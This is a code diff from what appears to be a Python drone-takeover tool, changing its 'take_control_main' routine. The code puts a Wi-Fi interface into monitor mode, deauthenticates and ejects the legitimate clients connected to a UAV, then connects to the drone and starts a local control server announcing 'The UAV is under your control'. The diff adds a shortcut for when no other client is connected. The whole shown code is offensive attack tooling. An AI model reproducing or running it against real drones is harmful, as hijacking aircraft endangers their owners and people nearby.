@@ -58,7 +58,7 @@ def launch_server():
     cmd2 = "firefox localhost:3001"
     #os.system(cmd)
     server = subprocess.Popen(cmd, shell=True)
-    print("\n{}The UAV is under your control !\n".format(GREEN))
+    print("\n{}The UAV is under your control !".format(GREEN))
     print("\n{}INFO{}: Please connect to {}http://localhost:3001{} with your browser".format(YELLOW, GREEN, WHITE, GREEN))
     #os.system(cmd2)
     #firefox = subprocess.Popen('firefox http://localhost:3001 >>/dev/null 2>>/dev/null &', shell=True, preexec_fn=demote())
@@ -73,20 +73,24 @@ def exit():
 def take_control_main(drone, iface):
     network = '192.168.1.2-10'
     client_list = scanNetwork(network)
-    mac_drone = drone.bssid
-    drone_essid = drone.essid
-    iface_mon = iface+"mon"
-    start_airmon(iface)
-    for client in client_list:
-        try :
-            print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
-            scan_wifi(iface_mon,drone)
-            eject_client(client, mac_drone, drone_essid, iface_mon)
-        except:
-            print("{}ERROR{}:No client connected{}".format(RED,GREEN, WHITE))
-    stop_airmon(iface_mon)
-    connect_to_uav(drone, iface)  #re-connection to the UAV
-    serv = launch_server()
+    if client_list == []:
+        print("{}You are the only one connected to the UAV".format(GREEN))
+        serv = launch_server()
+    else:
+        mac_drone = drone.bssid
+        drone_essid = drone.essid
+        iface_mon = iface+"mon"
+        start_airmon(iface)
+        for client in client_list:
+            try :
+                print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
+                scan_wifi(iface_mon,drone)
+                eject_client(client, mac_drone, drone_essid, iface_mon)
+            except:
+                print("{}ERROR{}:No client connected{}".format(RED,GREEN, WHITE))
+        stop_airmon(iface_mon)
+        connect_to_uav(drone, iface)  #re-connection to the UAV
+        serv = launch_server()
 
     while True:
         exit()
